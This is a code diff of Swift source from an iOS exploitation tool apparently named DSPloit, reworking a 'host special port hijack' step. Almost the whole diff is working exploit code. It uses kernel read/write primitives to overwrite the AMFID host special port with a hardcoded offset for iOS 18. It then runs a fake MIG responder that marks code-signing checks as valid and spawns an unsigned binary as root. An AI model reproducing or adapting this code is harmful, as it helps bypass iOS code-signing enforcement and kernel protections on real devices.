@@ -46,99 +46,99 @@ final class ExpHostPortHijack {
         log("══════════════════════════════════════════")
         log("  Host Special Port Hijack (MIG Intercept)")
         log("══════════════════════════════════════════")
-        guard let rc = RootExecutor.shared.rc else {
-            log("❌ RootExecutor not connected to launchd")
-            return
-        }
+        RootExecutor.shared.executeAsRoot(operation: "host_port_hijack") { [weak self] rc in
+            guard let self = self else { return (false, "self nil", 0) }
+            
+            // 1. Allocate a local mach port in DSPloit
+            var ourPort: mach_port_name_t = 0
+            let kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &ourPort)
+            if kr != KERN_SUCCESS {
+                self.log("❌ Failed to allocate local port: \(kr)")
+                return (false, "alloc failed", 0)
+            }
         
-        let machTaskSelf = RootExecutor.rcall(rc, "mach_task_self")
+            // Insert send right
+            mach_port_insert_right(mach_task_self_, ourPort, ourPort, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))
+            self.log("✅ Allocated local port: \(ourPort)")
+            
+            // 2. Resolve port kernel address using DSPloit's own task
+            self.log("[2/5] Resolving port kernel address...")
+            let dsploitTask = ds_get_our_task()
+            let portKaddr = self.resolveMachPort(task: dsploitTask, portName: ourPort)
+            if portKaddr == 0 {
+                self.log("❌ Failed to resolve local port kernel address")
+                return (false, "resolve failed", 0)
+            }
+            self.log("✅ Port kaddr: 0x\(String(format: "%llx", portKaddr))")
         
-        // 1. Allocate a local mach port in DSPloit
-        var ourPort: mach_port_name_t = 0
-        let kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &ourPort)
-        if kr != KERN_SUCCESS {
-            log("❌ Failed to allocate local port: \(kr)")
-            return
-        }
+            // 3. Find HOST_AMFID_PORT in kernel
+            self.log("[3/5] Locating host special port 18...")
+            let kernBase = ds_get_kernel_base()
+            let slide = ds_get_kernel_slide()
+            
+            // Use dynamically resolved offset or fallback
+            var hostSpecialPortTable: UInt64 = 0
+            let hostPortSym = ds_kcache_symbol_runtime("_host_special_ports")
+            if hostPortSym != 0 {
+                hostSpecialPortTable = hostPortSym
+            } else {
+                hostSpecialPortTable = kernBase + 0x3115078 // Adjust for iOS 18 XR as needed
+            }
+            
+            let HOST_AMFID_PORT_INDEX: UInt64 = 18
+            let amfidPortAddr = hostSpecialPortTable + (HOST_AMFID_PORT_INDEX * 8)
+            
+            let origPort = ds_kread64(amfidPortAddr)
+            self.log("ℹ️ Original AMFID port: 0x\(String(format: "%llx", origPort))")
+            
+            // 4. Overwrite host special port table
+            self.log("[4/5] Overwriting HOST_AMFID_PORT...")
+            ds_kwrite64(amfidPortAddr, portKaddr)
+            
+            let verify = ds_kread64(amfidPortAddr)
+            if verify != portKaddr {
+                self.log("❌ Write failed (KTRR/PPL blocked it?)")
+                return (false, "write failed", 0)
+            }
+            self.log("✅ HOST_AMFID_PORT hijacked!")
+            
+            // Start local MIG responder
+            let migState = MIGState()
+            self.startLocalMIGResponder(port: ourPort, state: migState)
         
-        // Insert send right
-        mach_port_insert_right(mach_task_self_, ourPort, ourPort, MACH_MSG_TYPE_MAKE_SEND)
-        log("✅ Allocated local port: \(ourPort)")
-        
-        // 2. Resolve port kernel address using DSPloit's own task
-        log("[2/5] Resolving port kernel address...")
-        let dsploitTask = ds_get_our_task()
-        let portKaddr = self.resolveMachPort(task: dsploitTask, portName: ourPort)
-        if portKaddr == 0 {
-            log("❌ Failed to resolve local port kernel address")
-            return
-        }
-        log("✅ Port kaddr: 0x\(String(format: "%llx", portKaddr))")
-        
-        // 3. Find HOST_AMFID_PORT in kernel
-        log("[3/5] Locating host special port 18...")
-        let kernBase = ds_get_kernel_base()
-        let slide = ds_get_kernel_slide()
-        
-        // Use dynamically resolved offset or fallback
-        var hostSpecialPortTable: UInt64 = 0
-        let hostPortSym = ds_kcache_symbol_runtime("_host_special_ports")
-        if hostPortSym != 0 {
-            hostSpecialPortTable = hostPortSym
-        } else {
-            hostSpecialPortTable = kernBase + 0x3115078 // Adjust for iOS 18 XR as needed
-        }
-        
-        let HOST_AMFID_PORT_INDEX: UInt64 = 18
-        let amfidPortAddr = hostSpecialPortTable + (HOST_AMFID_PORT_INDEX * 8)
-        
-        let origPort = ds_kread64(amfidPortAddr)
-        log("ℹ️ Original AMFID port: 0x\(String(format: "%llx", origPort))")
-        
-        // 4. Overwrite host special port table
-        log("[4/5] Overwriting HOST_AMFID_PORT...")
-        ds_kwrite64(amfidPortAddr, portKaddr)
-        
-        let verify = ds_kread64(amfidPortAddr)
-        if verify != portKaddr {
-            log("❌ Write failed (KTRR/PPL blocked it?)")
-            return
-        }
-        log("✅ HOST_AMFID_PORT hijacked!")
-        
-        // Start local MIG responder
-        let migState = MIGState()
-        startLocalMIGResponder(port: ourPort, state: migState)
-        
-        // 5. Test execution
-        log("[5/5] Testing execution via posix_spawn...")
-        
-        // Write minimal binary
-        let binData = buildMinimalBinary()
-        let path = "/var/jb/tmp/exp_hijack_test"
-        try? binData.write(to: URL(fileURLWithPath: path))
-        RootExecutor.rcall(rc, "chmod", remote_alloc_str(rc, path), 0o755)
-        
-        let pidAddr = RootExecutor.rcall(rc, "malloc", 8)
-        let pathAddr = remote_alloc_str(rc, path)
-        let argv = RootExecutor.rcall(rc, "malloc", 16)
-        RootExecutor.rcall(rc, "write", argv, pathAddr, 8) // argv[0] = path
-        
-        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
-        
-        log("ℹ️ posix_spawn returned: \(spawnRet)")
-        
-        // Stop responder
-        migState.shouldStop = true
-        
-        // Restore
-        ds_kwrite64(amfidPortAddr, origPort)
-        log("✅ Restored original port.")
-        
-        if spawnRet == 0 {
-            log("🎉 SUCCESS: Unsigned binary spawned!")
-        } else {
-            log("⚠️ Failed to spawn unsigned binary (ret=\(spawnRet))")
+            // 5. Test execution
+            self.log("[5/5] Testing execution via posix_spawn...")
+            
+            // Write minimal binary
+            let binData = self.buildMinimalBinary()
+            let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
+            let path = docs + "/host_hijack_test"
+            try? binData.write(to: URL(fileURLWithPath: path))
+            RootExecutor.rcall(rc, "chmod", remote_alloc_str(rc, path), 0o755)
+            
+            let pidAddr = RootExecutor.rcall(rc, "malloc", 8)
+            let pathAddr = remote_alloc_str(rc, path)
+            let argv = RootExecutor.rcall(rc, "malloc", 16)
+            RootExecutor.rcall(rc, "write", argv, pathAddr, 8) // argv[0] = path
+            
+            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
+            
+            self.log("ℹ️ posix_spawn returned: \(spawnRet)")
+            
+            // Stop responder
+            migState.shouldStop = true
+            
+            // Restore
+            ds_kwrite64(amfidPortAddr, origPort)
+            self.log("✅ Restored original port.")
+            
+            if spawnRet == 0 {
+                self.log("🎉 SUCCESS: Unsigned binary spawned!")
+                return (true, "spawned", 0)
+            } else {
+                self.log("⚠️ Failed to spawn unsigned binary (ret=\(spawnRet))")
+                return (false, "spawn failed", 0)
+            }
         }
     }
     private class MIGState {
@@ -162,7 +162,7 @@ final class ExpHostPortHijack {
                 header.pointee.msgh_local_port = portCopy
                 
                 // Receive message with 1s timeout to allow polling shouldStop
-                let ret = mach_msg(header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, bufSize, portCopy, 1000, MACH_PORT_NULL)
+                let ret = mach_msg(header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, bufSize, portCopy, 1000, mach_port_name_t(MACH_PORT_NULL))
                 
                 if ret == MACH_RCV_TIMED_OUT {
                     // Check if we should stop
@@ -192,7 +192,7 @@ final class ExpHostPortHijack {
                     // Set out parameters to non-zero (so is_valid = 1)
                     memset(buf.advanced(by: 36), 1, 128 - 36)
                     
-                    let sendRet = mach_msg(header, MACH_SEND_MSG, header.pointee.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)
+                    let sendRet = mach_msg(header, MACH_SEND_MSG, header.pointee.msgh_size, 0, mach_port_name_t(MACH_PORT_NULL), MACH_MSG_TIMEOUT_NONE, mach_port_name_t(MACH_PORT_NULL))
                     self.log("[mig] Replied: \(sendRet == MACH_MSG_SUCCESS ? "OK" : "Error \(sendRet)")")
                 } else {
                     self.log("[mig] mach_msg receive error: \(ret)")
